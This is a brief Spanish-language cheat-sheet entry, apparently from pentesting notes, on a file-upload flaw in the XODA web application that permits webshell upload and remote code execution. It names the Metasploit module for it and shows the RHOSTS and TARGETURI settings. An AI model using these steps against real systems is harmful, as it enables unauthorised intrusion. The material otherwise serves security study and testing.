Vulnerabilidad en XODA que permite subida de archivos y ejecución remota.

• Aplicación web vulnerable  
• Permite subir webshell  
• Puede llevar a RCE

## Exploit XODA

Explota la subida de archivos en XODA.

```
use exploit/unix/webapp/xoda_file_upload
```
	set RHOSTS IP
	set TARGETURI /
### TARGETURI
Ruta donde está instalada la aplicación.
